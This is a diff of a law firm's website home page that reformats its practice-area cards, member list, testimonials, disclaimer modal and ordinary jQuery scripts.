-               <h4 class="h4">Advisory / Compliance / Negotiations</h4>
-                 <p class="para">We offer a variety of Services which encompasses a range of activities from Formation of Companies, Compliance Management to Mergers &amp; Acquisitions, Business Reorganisation and Reconstruction and Winding-up. Our Team has the expertise in propining expert counsel on legal issues pertaining to administration and liquidation. We also assist Enterprises in the Legal Aspects of raising financial resources either through the bourses or through other sources.</p>
-                <h5 class="h5">Corporate Governance, Capital Markets , Bankruptcy and Winding Up </h5>
-                     <ul>
-                     <li class="li">Formation of Companies</li>
-                     <li class="li">Governance Audits</li>
-                     <li class="li">Compliance Management</li>
-                     <li class="li">IPOs, Listing Compliances, Takeover Code, Insider Trading</li>
-                     <li class="li">Winding up &amp; Liquidation Includes matters relating to dealing with Registrar of Companies, appearance before NCLT, NCLAT, SEBI.</li>
-
-                  </ul>
-                    <div class="read-btn mt-3">
-                     <a href="practise-areas.php">Read More</a>
-                </div>
-
-               </div>
-               </div>
-    
-            <div class="col-lg-6 col-md-12 col-sm-12">
-            <div style=" padding:40px">
-             <div class="rooms-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp; animation-delay: 500ms;" data-wow-delay="500ms">
-               <figure><img src="images/about1.jpg"></figure>
-                </div>
-            </div>
-            </div>
-            </div>
-
-
-
-
-<div class="room-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
-   <div>
-      <div class="row rooms-heading">
-         <div class="col-md-12 col-sm-12 text-center">
-            <h2>Our Core Members</h2>
-         </div>
-         <div class="col-md-12 col-sm-12 p-5">
-   <div class="homepartnersleft">
-         <div class="homepartners">
-         <div class="homepartners-img"> </div>
-         <h6>Aditya Gautam </h6>
-         <p>B.Tech , LLB , PGDCL </p>
-         </div>
-
-             <div class="homepartners">
-         <div class="homepartners-img"> </div>
-         <h6>Yogesh Vashista</h6>
-         <p>B.Tech , LLB , LLM</p>
-         </div>
-  <div class="homepartners">
-         <div class="homepartners-img"> </div>
-         <h6>Abhishek Vashista</h6>
-         <p>B.E. , LLB</p>
-         </div>
-
-            <div class="homepartners">
-         <div class="homepartners-img"> </div>
-         <h6>Shuchi Sodhi </h6>
-         <p>B.A. , LLB (Hons) </p>
-         </div> 
-
-         
-         <div class="homepartners">
-         <div class="homepartners-img"> </div>
-         <h6>Abhijit Deshmukh </h6>
-         <p>B.E. , LLB (Hons) </p>
-         </div> 
-
-         </div>
-         </div>
-      </div>
-    
    </div>
-</div>
-
-<div class="map wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
- <iframe class="gmap_iframe" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=600&amp;height=400&amp;hl=en&amp;q=Tribune Mitra Vihar Sector 29 , Panchkula , Haryana&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed"></iframe>
-</div>
-
-<div class="testimonial-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
-   <div>
-      <div class="row rooms-heading">
-         <div class="col-md-12 col-sm-12 text-center">
-            <h2>Testimonials</h2>
+   <div class="row" style="width: 100%; background-image: url(https://lexpremier.in/images/about3.jpg);;
+      ">
+      <div class="col-lg-6 col-md-12 col-sm-12">
+         <div style="padding: 40px;">
+            <figure><img class="legal-exper" src="images/about3.jpg"></figure>
          </div>
       </div>
-      <div class="container testy-slider">
-         <div id="owl-demo" class="owl-carousel">
-            <div class="item">
-               <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
-                  data-wow-delay="100ms">
-                  <div class="testimonial-cont-top">
-                     <div class="test-left">
-                        <i><img src="images/profile.png"></i>
-                        <span>Suresh</span>
-                     </div>
-                     <ul>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                         <li><img src="images/star.png"></li>
-                       
-                     </ul>
-                  </div>
-                  <p>— I spoke with him he handled my case very well and adviced me in every possible way. I would love to recommend him for any kind of corporate issues. <br> <br></p>
-               </div>
-            </div>
-            <div class="item">
-               <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
-                  data-wow-delay="300ms">
-                  <div class="testimonial-cont-top">
-                     <div class="test-left">
-                        <i><img src="images/profile.png"></i>
-                        <span>Anjali</span>
-                     </div>
-                     <ul>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                     </ul>
-                  </div>
-                  <p>— Very responsive and quick. They have strong understanding of their domain and has been of immense help in advising on my issue regarding employer notice period and pending salaries. Highly recommended..</p>
-               </div>
-            </div>
-            <div class="item">
-               <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
-                  data-wow-delay="500ms">
-                  <div class="testimonial-cont-top">
-                     <div class="test-left">
-                        <i><img src="images/profile.png"></i>
-                        <span>Mukesh</span>
-                     </div>
-                     <ul>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                        <li><img src="images/star.png"></li>
-                     </ul>
-                  </div>
-                  <p>— The team is extremely diligent and professional. they are in my opinion the best family lawyers in Chandigarh. they assist you to provide a solution and guide u through the entire process in a smooth manner.</p>
-               </div>
+      <div class="col-lg-6 col-md-12 col-sm-12">
+         <div style="padding: 40px;">
+            <h2 class="h2">Legal Expertise. Credible Solutions.</h2>
+            <p class="para"></p>
+            <p class="para">At Lex Premier, We enhance our knowledge and service offerings by merging practice and sector
+               groups to develop a comprehensive understanding of our clients’ business and markets. We focus on
+               relationships, not deals, and we are considered very approachable and accessible from top to bottom
+               of the hierarchy.
+            </p>
+            <p class="para">
+               The firm combines flexibility and responsiveness with practical, in-depth experience to provide
+               legal advice that reflects the commercial context in which it is sought. We form close,
+               constructive, and responsive working relationships, and our approach ensures continuity and clear
+               communication.
+            </p>
+            <div class="read-btn">
+               <a href="about-us.html">Read More</a>
             </div>
          </div>
       </div>
    </div>
-</div>
-
-<?php include 'include/footer.php';?>
-
-
-<!-- Modal -->
-<div class="modal fade" id="myModel" tabindex="-1" role="dialog" aria-labelledby="myModelLabel" aria-hidden="true">
-   <div class="modal-dialog modal-lg" role="document">
-      <div class="modal-content disclaimer">
-         <div class="modal-header">
-            <h5 class="modal-title" id="myModelLabel">DISCLAIMER & CONFIRMATION</h5>
-         </div>
-         <div class="modal-body p-4 text-justify">
-            <p>Under the rules of the Bar Council of India, Lexpremier (the “Firm”) is prohibited from soliciting work or advertising. By clicking, "I Agree" below, the user acknowledges that:</p>
-
+   <div class="row p-5">
+      <div class="col-lg-12 col-md-12 col-sm-12 text-center ">
+         <h3>Practise Area and categories are </h3>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#corporatebusiness">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/business-and-corporate-law.png" alt=""> 
+                  </div>
+                  <h4 class="stat-title">Corporate &amp; Business Law</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#arbitrationConciliation">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Arbitration_and_Conciliation.png" alt="">
+                  </div>
+                  <h4  class="stat-title">Arbitration &amp; Conciliation</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#familymatters">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Matrimonial_Disputes.png" alt="">
+                  </div>
+                  <h4 class="stat-title">Matrimonial Disputes</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#civil">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Civil.png" alt=""> 
+                  </div>
+                  <h4 class="stat-title">Civil</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#ipr">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/IPR.png" alt=""> 
+                  </div>
+                  <h4 class="stat-title">IPR</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#criminallaw">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Criminal_Law.png">
+                  </div>
+                  <h4 class="stat-title">Criminal Law</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#immigration">
+            <div class="card card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Immigration.png">
+                  </div>
+                  <h4 class="stat-title">Immigration (In Indian Courts)</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+      <div class="col-lg-3 col-md-6 col-sm-6">
+         <a href="practise-areas.php#statups">
+            <div class="card card-margin card-margin">
+               <div class="card-body card-style">
+                  <div class="stat-icon-box teacher">
+                     <img src="images/icons/Start-ups.png">
+                  </div>
+                  <h4 class="stat-title">Start-ups</h4>
+               </div>
+            </div>
+         </a>
+      </div>
+   </div>
+   <!--<div class="tab-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">-->
+   <!--   <div>-->
+   <div class="row corporate-edit">
+      <div class="col-lg-6 col-md-12 col-sm-12">
+         <div style="padding: 40px;">
+            <h2 class="h2">CORPORATE &amp; BUSINESS LAW</h2>
+            <h4 class="h4">Advisory / Compliance / Negotiations</h4>
+            <p class="para">We offer a variety of Services which encompasses a range of activities from Formation of Companies, Compliance Management to Mergers &amp; Acquisitions, Business Reorganisation and Reconstruction and Winding-up. Our Team has the expertise in propining expert counsel on legal issues pertaining to administration and liquidation. We also assist Enterprises in the Legal Aspects of raising financial resources either through the bourses or through other sources.</p>
+            <h5 class="h5">Corporate Governance, Capital Markets , Bankruptcy and Winding Up </h5>
             <ul>
-               <li>There has been no advertisement, personal communication, solicitation, invitation or inducement of any sort whatsoever from the Firm or any of its  members to solicit any work or advertise through this website</li>
-               <li>The purpose of this website is to provide the user with information about the Firm, its practice areas, its advocates and solicitors;</li>
-               <li>The user wishes to gain more information about the Firm for his/her own information and personal/ professional use; and</li>
-               <li>The information about the Firm is provided to the user only on his/ her specific request and any information obtained or materials downloaded from this website are completely at the user’s volition and any transmission, receipt or use of this website would not create any lawyer-client relationship.</li>
-               <li>This website is not intended to be a source of advertising or solicitation and the contents hereof should not be construed as legal advice in any manner whatsoever.</li>
-               <li>The Firm is not liable for any consequence of any action taken by the user relying on material/ information provided under this website. In cases where the user requires any assistance, he/she must seek independent legal advice.</li>
-               <li>The content of this website is Intellectual Property of the Firm.</li>
+               <li class="li">Formation of Companies</li>
+               <li class="li">Governance Audits</li>
+               <li class="li">Compliance Management</li>
+               <li class="li">IPOs, Listing Compliances, Takeover Code, Insider Trading</li>
+               <li class="li">Winding up &amp; Liquidation Includes matters relating to dealing with Registrar of Companies, appearance before NCLT, NCLAT, SEBI.</li>
             </ul>
-            <p>Please read and accept our website’s Terms of Use and our Privacy Policy</p>
+            <div class="read-btn mt-3">
+               <a href="practise-areas.php">Read More</a>
+            </div>
          </div>
-         <div class="modal-footer">
-            <button type="button" class="link-btn btn-easy btn-dismiss" data-dismiss="modal">I Accept</button>
+      </div>
+      <div class="col-lg-6 col-md-12 col-sm-12">
+         <div style=" padding:40px">
+            <div class="rooms-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp; animation-delay: 500ms;" data-wow-delay="500ms">
+               <figure><img src="images/about1.jpg"></figure>
+            </div>
          </div>
       </div>
    </div>
-
-
+   <div class="room-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
+      <div>
+         <div class="row rooms-heading">
+            <div class="col-md-12 col-sm-12 text-center">
+               <h2>Our Core Members</h2>
+            </div>
+            <div class="col-md-12 col-sm-12 p-5">
+               <div class="homepartnersleft">
+                  <div class="homepartners">
+                     <div class="homepartners-img"> </div>
+                     <h6>Aditya Gautam </h6>
+                     <p>B.Tech , LLB , PGDCL </p>
+                  </div>
+                  <div class="homepartners">
+                     <div class="homepartners-img"> </div>
+                     <h6>Yogesh Vashista</h6>
+                     <p>B.Tech , LLB , LLM</p>
+                  </div>
+                  <div class="homepartners">
+                     <div class="homepartners-img"> </div>
+                     <h6>Abhishek Vashista</h6>
+                     <p>B.E. , LLB</p>
+                  </div>
+                  <div class="homepartners">
+                     <div class="homepartners-img"> </div>
+                     <h6>Shuchi Sodhi </h6>
+                     <p>B.A. , LLB (Hons) </p>
+                  </div>
+                  <div class="homepartners">
+                     <div class="homepartners-img"> </div>
+                     <h6>Abhijit Deshmukh </h6>
+                     <p>B.E. , LLB (Hons) </p>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+   <div class="map wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
+      <iframe class="gmap_iframe" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=600&amp;height=400&amp;hl=en&amp;q=Tribune Mitra Vihar Sector 29 , Panchkula , Haryana&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed"></iframe>
+   </div>
+   <div class="testimonial-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
+      <div>
+         <div class="row rooms-heading">
+            <div class="col-md-12 col-sm-12 text-center">
+               <h2>Testimonials</h2>
+            </div>
+         </div>
+         <div class="container testy-slider">
+            <div id="owl-demo" class="owl-carousel">
+               <div class="item">
+                  <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
+                     data-wow-delay="100ms">
+                     <div class="testimonial-cont-top">
+                        <div class="test-left">
+                           <i><img src="images/profile.png"></i>
+                           <span>Suresh</span>
+                        </div>
+                        <ul>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                        </ul>
+                     </div>
+                     <p>— I spoke with him he handled my case very well and adviced me in every possible way. I would love to recommend him for any kind of corporate issues. <br> <br></p>
+                  </div>
+               </div>
+               <div class="item">
+                  <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
+                     data-wow-delay="300ms">
+                     <div class="testimonial-cont-top">
+                        <div class="test-left">
+                           <i><img src="images/profile.png"></i>
+                           <span>Anjali</span>
+                        </div>
+                        <ul>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                        </ul>
+                     </div>
+                     <p>— Very responsive and quick. They have strong understanding of their domain and has been of immense help in advising on my issue regarding employer notice period and pending salaries. Highly recommended..</p>
+                  </div>
+               </div>
+               <div class="item">
+                  <div class="testimonial-cont wow fadeInUp" style="visibility: visible; animation-name: fadeInUp"
+                     data-wow-delay="500ms">
+                     <div class="testimonial-cont-top">
+                        <div class="test-left">
+                           <i><img src="images/profile.png"></i>
+                           <span>Mukesh</span>
+                        </div>
+                        <ul>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                           <li><img src="images/star.png"></li>
+                        </ul>
+                     </div>
+                     <p>— The team is extremely diligent and professional. they are in my opinion the best family lawyers in Chandigarh. they assist you to provide a solution and guide u through the entire process in a smooth manner.</p>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+   <?php include 'include/footer.php';?>
+   <!-- Modal -->
+   <div class="modal fade" id="myModel" tabindex="-1" role="dialog" aria-labelledby="myModelLabel" aria-hidden="true">
+      <div class="modal-dialog modal-lg" role="document">
+         <div class="modal-content disclaimer">
+            <div class="modal-header">
+               <h5 class="modal-title" id="myModelLabel">DISCLAIMER & CONFIRMATION</h5>
+            </div>
+            <div class="modal-body p-4 text-justify">
+               <p>Under the rules of the Bar Council of India, Lexpremier (the “Firm”) is prohibited from soliciting work or advertising. By clicking, "I Agree" below, the user acknowledges that:</p>
+               <ul>
+                  <li>There has been no advertisement, personal communication, solicitation, invitation or inducement of any sort whatsoever from the Firm or any of its  members to solicit any work or advertise through this website</li>
+                  <li>The purpose of this website is to provide the user with information about the Firm, its practice areas, its advocates and solicitors;</li>
+                  <li>The user wishes to gain more information about the Firm for his/her own information and personal/ professional use; and</li>
+                  <li>The information about the Firm is provided to the user only on his/ her specific request and any information obtained or materials downloaded from this website are completely at the user’s volition and any transmission, receipt or use of this website would not create any lawyer-client relationship.</li>
+                  <li>This website is not intended to be a source of advertising or solicitation and the contents hereof should not be construed as legal advice in any manner whatsoever.</li>
+                  <li>The Firm is not liable for any consequence of any action taken by the user relying on material/ information provided under this website. In cases where the user requires any assistance, he/she must seek independent legal advice.</li>
+                  <li>The content of this website is Intellectual Property of the Firm.</li>
+               </ul>
+               <p>Please read and accept our website’s Terms of Use and our Privacy Policy</p>
+            </div>
+            <div class="modal-footer">
+               <button type="button" class="link-btn btn-easy btn-dismiss" data-dismiss="modal">I Accept</button>
+            </div>
+         </div>
+      </div>
+   </div>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/wow.js"></script>
    <script src="js/parsley.js"></script>
-
    <script src="js/modernizr.min.js"></script>
    <script src="js/isotope.pkgd.js"></script>
    <script src="js/jquery.magnific-popup.js"></script>
    <script src="js/custom.js"></script>
-
-
-
    <script src="js/owl.carousel.js"></script>
    <script>
       $(document).ready(function () {
-
+      
          setTimeout(function(){  
             if(!getCookie('approved'))
                $('#myModel').modal('show')
          },2000);
-
+      
          $('.btn-dismiss').on('click', function(){
             setCookie('approved', '1', '1000')
          })
-
+      
          $(document).on("scroll", function () {
             if
                ($(document).scrollTop() > 1) {
@@ -449,7 +407,7 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
                $("header").removeClass("shrink");
             }
          });
-
+      
          $("#owl-demo").owlCarousel({
             nav: false,
             slideSpeed: 3000,
@@ -475,18 +433,18 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
                }
             }
          });
-
+      
          $('.portfolio-menu li').click(function () {
             $('.portfolio-menu li').removeClass('active');
             $(this).addClass('active');
-
+      
             var selector = $(this).attr('data-filter');
             $('.portfolio-item').isotope({
                filter: selector
             });
             return false;
          });
-
+      
          var popup_btn = $('.popup-btn');
          popup_btn.magnificPopup({
             type: 'image',
@@ -494,7 +452,7 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
                enabled: true
             }
          });
-
+      
          wow = new WOW(
             {
                animateClass: 'animated',
@@ -504,8 +462,8 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
             }
          );
          wow.init();
-
-
+      
+      
          $('#sendContact').on('submit', function (e) {
             $("#mail-status").html('');
             e.preventDefault(); //=== To Avoid Page Refresh and Fire the Event "Click"===
@@ -532,23 +490,20 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
                });
             }
          });
-
-      });	 
+      
+      });    
    </script>
-
    <script src="js/menu.js"></script>
    <style type="text/css">
       .disclaimer ul li{
-         list-style: disc;
-         margin-left: 3%;
+      list-style: disc;
+      margin-left: 3%;
       }
       .disclaimer h5{
-
-          width: 100%;
-          text-align: center;
-          font-size: 2rem;
+      width: 100%;
+      text-align: center;
+      font-size: 2rem;
       }
    </style>
    </body>
-
 </html>
